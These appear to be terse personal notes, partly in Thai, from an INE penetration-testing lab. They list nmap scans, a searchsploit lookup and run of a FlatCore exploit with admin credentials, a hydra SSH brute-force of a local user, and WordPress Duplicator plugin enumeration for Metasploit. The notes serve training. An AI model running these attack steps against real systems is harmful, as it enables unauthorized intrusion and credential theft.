`nmap -sC -sV target1.ine.local`

`searchsploit flatcore`
case พิเศษ อันนี้ เซิซไม่เจอใน msfconsole ตรงๆ ต้องจดเลขไว้
php/webapps/50262.py

`searchsploit -m 50262`
ต้องเอามารันเอง 

`python3 50262.py http://target1.ine.local admin password1`


--

`ls -l /home`
drwxr-x--- 1 iamaweakuser iamaweakuser 4096 Oct  6 17:37 iamaweakuser

brute force
`hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://target1.ine.local`

--

`nmap -sC -sV target2.ine.local`

`nmap -p80 --script http-wordpress-enum target2.ine.local`
duplicator 1.3.26

`search duplicatator`
`use0`
`options`
